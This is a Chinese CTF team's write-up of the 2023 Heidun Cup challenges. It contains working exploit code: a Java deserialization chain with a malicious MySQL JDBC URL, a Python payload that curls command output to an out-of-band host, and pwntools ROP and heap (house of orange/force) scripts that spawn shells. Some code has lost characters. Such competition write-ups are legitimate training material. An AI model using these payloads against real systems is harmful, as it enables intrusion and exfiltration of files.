# 2023黑盾杯-WriteUp

> 原文: https://www.ctfiot.com/118253.html
> ID: 118253

EDI

JOIN US ▶▶▶

招新

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn misc方向的师傅）有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。

点击蓝字 ·  关注我们

01

Web

1

web（初赛）

拿到一个jar包，反编译得到。

public class SecurityCheck { private final String input;
 public SecurityCheck(String input) { this.input = input; checkForBlockedClasses(); }
 private void checkForBlockedClasses() { Pattern pattern = Pattern.compile("(?i)(TemplatesImpl|JdbcRowSetImpl|Jndi|54656D706C61746573496D706C|BadAttributeValueExpException)"); if (pattern.matcher(this.input).find()) throw new SecurityException("hacker"); }}

package com.example;
import com.ctf.bean.MyBean;import com.vaadin.data.util.NestedMethodProperty;import com.vaadin.data.util.PropertysetItem;import org.apache.commons.codec.binary.Hex;
import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;
public class Exp { public static void main(String[] args) throws Exception {
 MyBean myBean =new MyBean(); myBean.setDatabase("mysql://vps:3306/test?user=fileread_file:///flag.txt&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=655360&allowUrlInLocalInfile=true#");
 PropertysetItem p = new PropertysetItem();
 NestedMethodProperty<Object> n = new NestedMethodProperty<Object>(myBean, "Connection");
 p.addItemProperty("Connection", n);
 BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("v"); Field field = BadAttributeValueExpException.class.getDeclaredField("val"); field.setAccessible(true); field.set(badAttributeValueExpException, p);
 ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream out = new ObjectOutputStream(bos); out.writeObject(badAttributeValueExpException); out.flush(); byte[] bytes = bos.toByteArray();
 char[] hexChars = Hex.encodeHex(bytes); String hexString = new String(hexChars);
 System.out.println(hexString.toUpperCase()); }}

然后把生成的hex字符串填在下面HexAsciiSerializedMap后面

{"1":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"2":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:tihuanzheli;",}}

2

pypath（复赛）

from flask import Flask, request, Responseimport osimport shutilimport site
app = Flask(__name__)
@app.route('/')def index(): return app.send_static_file('index.html')
@app.route('/upload', methods=['POST'])def upload(): f = request.files["data"] with open(f'/tmp/storage/{f.filename}', 'wb+') as destination: destination.write(f.read())    return Response("File is uploaded!", 200)

传文件 默认/tmp/storage/路径 目录穿越构造../

@app.route('/install', methods=['GET'])def install(): package_name = request.args.get('package_name') #获取包名 if '..' in package_name: #防止穿越 return Response("Not allowed!", 400)
 src = os.path.join('contrib', 'packages', package_name) dst = os.path.join('/tmp/extract', package_name)
 shutil.copy(src, dst) shutil.unpack_archive(dst, extract_dir='/tmp/extract')#安装包 return Response("Installed!", 200)

@app.route('/clean', methods=['GET'])def clean(): file = os.path.basename(request.args.get('file')) file_safe = f'/tmp/storage/{file}' os.unlink(file_safe) return Response("file removed!", 200)

@app.route('/add', methods=['GET'])def add(): site_dir = "/tmp/extract" name = request.args.get('name') site.addpackage(site_dir, name, None)#addpackage可以加一个python文件if __name__ == "__main__":    app.run(debug=True, host='0.0.0.0')

用bp自带的Collaborator来dnslog

构造exp.py

exp1.py

import os;os.system("curl http://omedlr2zywi92zsul4skkk823t9kxalz.oastify.com/`ls /|base64`")

然后上传，去GET /add?name=exp1.py一次

YXBwCmJpbgpib290CmRldgpldGMKZmxhZ19vbmxpbmVfZG9ja2VyXzQ0NzhfNTgxXzIzNzIudHh0

base64解密：appbinbootdevetcflag_online_docker_4478_581_2372.txt

import os;os.system("curl http://omedlr2zywi92zsul4skkk823t9kxalz.oastify.com/`cat /flag_online_docker_4478_581_2372.txt|base64`")

ZmxhZ3thODc3MWFiNGFhfQ==base64解码：flag{a8771ab4aa}

02

Misc

1

DNS-流量分析（初赛）

504b03041400090008003c1bee5204212ed6340000002600000008000000666c61672e747874c6060a3144f6c49c5bc8305e76f334670b51c53ce58ff0eb452daa8cc6307fa2e2e4fad9c62587a0a6e29c0e30e71dc6505d2c24504b070804212ed63400000026000000504b01021f001400090008003c1bee5204212ed63400000026000000080024000000000000002000000000000000666c61672e7478740a002000000000000100180056f63fe71c78d70156f63fe71c78d7016bd2d4340e78d701504b050600000000010001005a0000006a0000000000

密码爆破为：Ap3l，然后打开就是flag。

flag{496d8981f449e45f6e39e1faa0b1ab8a}

2

mylog（初赛）

mysqlbinlog mylog.000001 > mysql.sql

得到mysql.sql文件 导入mysql，source Y:mysql.sql

3

威胁情报分享2（复赛）

f = open("network.txt","r")w = open("result.txt","w")# a = '{"Time":"2023/1/1 0:17:27", "SrcHost":"192.168.194.119", "DestHost":"40.118.19.83"},'# print(a)
for a in f.readlines(): a = a.split(""DestHost":"")[1] a = a.split(""}")[0] print(a) w.write(a+"n")
f.closew.close

再正则处理一下ioc.txt，直接在sublime里面操作，replace。

{"type":"domain", "ioc":" -> 空{"type":"ip", "ioc":" -> 空", "tag":".* -> 空

然后得到只有ip和域名的文本，用python进行匹配，找到相似点。

f = open("ioc1.txt","r")w = open("result.txt","r")
for a in f.readlines(): for b in w.readlines(): b = b[-6:] if b in a: print(b)
f.closew.close

可以看到y.net在ioc和network中大量出现，猜测flag带y.net

直接全部复制下来，一个个find，最后可以找到。

flag{lprbriry.net}

4

QZ（复赛）

ZmhxZ3sxMnF3YXN6eGNkZTN9base64解码为：fhqg{12qwaszxcde3}flag{12qwaszxcde3}

03

Crypto

1

py-math-game

import pwnfrom pwn import *pwn.context.log_level='debug'# 设置目标地址和端口host = '39.104.26.167'port = 6681
# 连接目标conn = remote(host, port)# 转数据retest=conn.recv()retest=retest.decode(encoding='utf-8')retest1=retest.split('n')n=int(retest1[1].split("=")[1])sper = retest1[2].split('=')[0]newsper1 = sper.replace('X','*')flager = eval(newsper1)
# 发送数据conn.sendline(str(flager).encode(encoding='utf-8'))conn.recv()conn.sendline(b'open("/flag.txt").read()')conn.recv()

05

Pwn

1

pwn（初赛）

from pwn import *from struct import packfrom ctypes import *
def s(a): p.send(a)def sa(a, b): p.sendafter(a, b)def sl(a): p.sendline(a)def sla(a, b): p.sendlineafter(a, b)def r(): p.recv()def pr(): print(p.recv())def rl(a): return p.recvuntil(a)def inter(): p.interactive()def debug(): gdb.attach(p) pause()def get_addr(): return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
context(os='linux', arch='amd64', log_level='debug')p = process('./pwn')#p = remote('39.104.26.167', 27791)elf = ELF('./pwn')#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc-2.27.so')
kk = b'{>o<fi:`mjkj5daqd6fhugim~~rj5h='ret = 0x400691rdi = 0x400af3rsi_r15 = 0x400af1PLT1 = 0x4006A6buf = elf.bss() + 0x400
#gdb.attach(p, 'b *0x400a83')
s(kk + b'x00')sleep(1)s(b'a'*0x38 + p64(rsi_r15) + p64(elf.got['alarm'])*2 + p64(elf.sym['read']) + p64(rsi_r15) + p64(buf)*2 + p64(elf.sym['read']) + p64(0x400AEA) + p64(0)*2 + p64(elf.got['alarm']) + p64(0)*2 + p64(buf) + p64(0x400AD0))sleep(2)s(b'xf5')sleep(3)s(b'/bin/shx00'.ljust(0x3b, b'a'))
#pause()
inter()

2

leak

没有free的堆，但是edit函数有offbyone漏洞

存在onegadget，就不用泄露地址了，利用house of orange泄露地址，再用house of force。

from pwn import *ly=remote('39.104.26.167',15910)#ly=process("./leak")context.log_level = "debug"libc=ELF('/home/ly/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')elf=ELF('./leak')def add(idx,size): ly.sendlineafter(b"Your choice:",b'1') ly.sendlineafter(b"Index:",str(idx)) ly.sendlineafter(b"Size:",str(size))def edit(idx,content): ly.sendlineafter(b"Your choice:", b'2') ly.sendlineafter(b"Index:",str(idx)) ly.sendafter(b"Content:",content)def show(idx): ly.sendlineafter(b"Your choice:", b'3') ly.sendlineafter(b"Index:",str(idx))
def delete(idx): ly.sendlineafter(b"Your choice:", b'4') ly.sendlineafter(b"Index:", str(idx))add(0,0x18)# house of orange 打个页对齐得size到top_chunkpayload=p64(0)*3+p64(0xd91)edit(0,payload)# 申请同样0xd91大小的chunk得到 ubsorted binadd(1,0x1008)# 拿unsorted bin 一部分泄露libcadd(2,0xd50)show(2)libc_base=u64(ly.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))-0x3ec2a0malloc_hook=libc_base+libc.sym['__malloc_hook']one_gadget=libc_base+0x10a2fc#onegadget 0x10a41c# hosue of force堆溢出 改topchunk size 为大数 达到任意地址分配的目的，直接劫持mallo_hook打one_gadgetedit(1,b'x00'*0x1008+p64(0xffffffffffffffff))add(3,-0x22010)#gdb.attach(ly)#pause()add(4,0x100)edit(4,b'x07'*0x30+p64(malloc_hook)*0x10+b'n')add(5,0xa0)edit(5,p64(one_gadget)+b'n')add(6,0x200)ly.interactive()

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
public class SecurityCheck { private final String input;
 public SecurityCheck(String input) { this.input = input; checkForBlockedClasses(); }
 private void checkForBlockedClasses() { Pattern pattern = Pattern.compile("(?i)(TemplatesImpl|JdbcRowSetImpl|Jndi|54656D706C61746573496D706C|BadAttributeValueExpException)"); if (pattern.matcher(this.input).find()) throw new SecurityException("hacker"); }}
```



```
package com.example;
import com.ctf.bean.MyBean;import com.vaadin.data.util.NestedMethodProperty;import com.vaadin.data.util.PropertysetItem;import org.apache.commons.codec.binary.Hex;
import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;
public class Exp { public static void main(String[] args) throws Exception {
 MyBean myBean =new MyBean(); myBean.setDatabase("mysql://vps:3306/test?user=fileread_file:///flag.txt&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=655360&allowUrlInLocalInfile=true#");
 PropertysetItem p = new PropertysetItem();
 NestedMethodProperty<Object> n = new NestedMethodProperty<Object>(myBean, "Connection");
 p.addItemProperty("Connection", n);
 BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("v"); Field field = BadAttributeValueExpException.class.getDeclaredField("val"); field.setAccessible(true); field.set(badAttributeValueExpException, p);
 ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream out = new ObjectOutputStream(bos); out.writeObject(badAttributeValueExpException); out.flush(); byte[] bytes = bos.toByteArray();
 char[] hexChars = Hex.encodeHex(bytes); String hexString = new String(hexChars);
 System.out.println(hexString.toUpperCase()); }}
```



```
{"1":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"2":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:tihuanzheli;",}}
```



```
from flask import Flask, request, Responseimport osimport shutilimport site
app = Flask(__name__)
@app.route('/')def index(): return app.send_static_file('index.html')
@app.route('/upload', methods=['POST'])def upload(): f = request.files["data"] with open(f'/tmp/storage/{f.filename}', 'wb+') as destination: destination.write(f.read())    return Response("File is uploaded!", 200)
```



```
@app.route('/install', methods=['GET'])def install(): package_name = request.args.get('package_name') #获取包名 if '..' in package_name: #防止穿越 return Response("Not allowed!", 400)
 src = os.path.join('contrib', 'packages', package_name) dst = os.path.join('/tmp/extract', package_name)
 shutil.copy(src, dst) shutil.unpack_archive(dst, extract_dir='/tmp/extract')#安装包 return Response("Installed!", 200)

@app.route('/clean', methods=['GET'])def clean(): file = os.path.basename(request.args.get('file')) file_safe = f'/tmp/storage/{file}' os.unlink(file_safe) return Response("file removed!", 200)
```



```
@app.route('/add', methods=['GET'])def add(): site_dir = "/tmp/extract" name = request.args.get('name') site.addpackage(site_dir, name, None)#addpackage可以加一个python文件if __name__ == "__main__":    app.run(debug=True, host='0.0.0.0')
```



```
import os;os.system("curl http://omedlr2zywi92zsul4skkk823t9kxalz.oastify.com/`ls /|base64`")
```



```
YXBwCmJpbgpib290CmRldgpldGMKZmxhZ19vbmxpbmVfZG9ja2VyXzQ0NzhfNTgxXzIzNzIudHh0
```



```
base64解密：appbinbootdevetcflag_online_docker_4478_581_2372.txt
```



```
import os;os.system("curl http://omedlr2zywi92zsul4skkk823t9kxalz.oastify.com/`cat /flag_online_docker_4478_581_2372.txt|base64`")
```



```
ZmxhZ3thODc3MWFiNGFhfQ==base64解码：flag{a8771ab4aa}
```



```
504b03041400090008003c1bee5204212ed6340000002600000008000000666c61672e747874c6060a3144f6c49c5bc8305e76f334670b51c53ce58ff0eb452daa8cc6307fa2e2e4fad9c62587a0a6e29c0e30e71dc6505d2c24504b070804212ed63400000026000000504b01021f001400090008003c1bee5204212ed63400000026000000080024000000000000002000000000000000666c61672e7478740a002000000000000100180056f63fe71c78d70156f63fe71c78d7016bd2d4340e78d701504b050600000000010001005a0000006a0000000000
```



```
flag{496d8981f449e45f6e39e1faa0b1ab8a}
```



```
mysqlbinlog mylog.000001 > mysql.sql
```



```
f = open("network.txt","r")w = open("result.txt","w")# a = '{"Time":"2023/1/1 0:17:27", "SrcHost":"192.168.194.119", "DestHost":"40.118.19.83"},'# print(a)
for a in f.readlines(): a = a.split(""DestHost":"")[1] a = a.split(""}")[0] print(a) w.write(a+"n")
f.closew.close
```



```
{"type":"domain", "ioc":" -> 空{"type":"ip", "ioc":" -> 空", "tag":".* -> 空
```



```
f = open("ioc1.txt","r")w = open("result.txt","r")
for a in f.readlines(): for b in w.readlines(): b = b[-6:] if b in a: print(b)
f.closew.close
```



```
flag{lprbriry.net}
```



```
ZmhxZ3sxMnF3YXN6eGNkZTN9base64解码为：fhqg{12qwaszxcde3}flag{12qwaszxcde3}
```



```
import pwnfrom pwn import *pwn.context.log_level='debug'# 设置目标地址和端口host = '39.104.26.167'port = 6681
# 连接目标conn = remote(host, port)# 转数据retest=conn.recv()retest=retest.decode(encoding='utf-8')retest1=retest.split('n')n=int(retest1[1].split("=")[1])sper = retest1[2].split('=')[0]newsper1 = sper.replace('X','*')flager = eval(newsper1)
# 发送数据conn.sendline(str(flager).encode(encoding='utf-8'))conn.recv()conn.sendline(b'open("/flag.txt").read()')conn.recv()
```



```
from pwn import *from struct import packfrom ctypes import *
def s(a): p.send(a)def sa(a, b): p.sendafter(a, b)def sl(a): p.sendline(a)def sla(a, b): p.sendlineafter(a, b)def r(): p.recv()def pr(): print(p.recv())def rl(a): return p.recvuntil(a)def inter(): p.interactive()def debug(): gdb.attach(p) pause()def get_addr(): return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
context(os='linux', arch='amd64', log_level='debug')p = process('./pwn')#p = remote('39.104.26.167', 27791)elf = ELF('./pwn')#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc-2.27.so')
kk = b'{>o<fi:`mjkj5daqd6fhugim~~rj5h='ret = 0x400691rdi = 0x400af3rsi_r15 = 0x400af1PLT1 = 0x4006A6buf = elf.bss() + 0x400
#gdb.attach(p, 'b *0x400a83')
s(kk + b'x00')sleep(1)s(b'a'*0x38 + p64(rsi_r15) + p64(elf.got['alarm'])*2 + p64(elf.sym['read']) + p64(rsi_r15) + p64(buf)*2 + p64(elf.sym['read']) + p64(0x400AEA) + p64(0)*2 + p64(elf.got['alarm']) + p64(0)*2 + p64(buf) + p64(0x400AD0))sleep(2)s(b'xf5')sleep(3)s(b'/bin/shx00'.ljust(0x3b, b'a'))
#pause()
inter()
```



```
from pwn import *ly=remote('39.104.26.167',15910)#ly=process("./leak")context.log_level = "debug"libc=ELF('/home/ly/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')elf=ELF('./leak')def add(idx,size): ly.sendlineafter(b"Your choice:",b'1') ly.sendlineafter(b"Index:",str(idx)) ly.sendlineafter(b"Size:",str(size))def edit(idx,content): ly.sendlineafter(b"Your choice:", b'2') ly.sendlineafter(b"Index:",str(idx)) ly.sendafter(b"Content:",content)def show(idx): ly.sendlineafter(b"Your choice:", b'3') ly.sendlineafter(b"Index:",str(idx))
def delete(idx): ly.sendlineafter(b"Your choice:", b'4') ly.sendlineafter(b"Index:", str(idx))add(0,0x18)# house of orange 打个页对齐得size到top_chunkpayload=p64(0)*3+p64(0xd91)edit(0,payload)# 申请同样0xd91大小的chunk得到 ubsorted binadd(1,0x1008)# 拿unsorted bin 一部分泄露libcadd(2,0xd50)show(2)libc_base=u64(ly.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))-0x3ec2a0malloc_hook=libc_base+libc.sym['__malloc_hook']one_gadget=libc_base+0x10a2fc#onegadget 0x10a41c# hosue of force堆溢出 改topchunk size 为大数 达到任意地址分配的目的，直接劫持mallo_hook打one_gadgetedit(1,b'x00'*0x1008+p64(0xffffffffffffffff))add(3,-0x22010)#gdb.attach(ly)#pause()add(4,0x100)edit(4,b'x07'*0x30+p64(malloc_hook)*0x10+b'n')add(5,0xa0)edit(5,p64(one_gadget)+b'n')add(6,0x200)ly.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/2-1685582047.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/5-1685582047.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/3-1685582048.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/5-1685582048.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/1-1685582049.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/8-1685582049.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/0-1685582050.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/6-1685582050.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/9-1685582051.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/3-1685582051.png)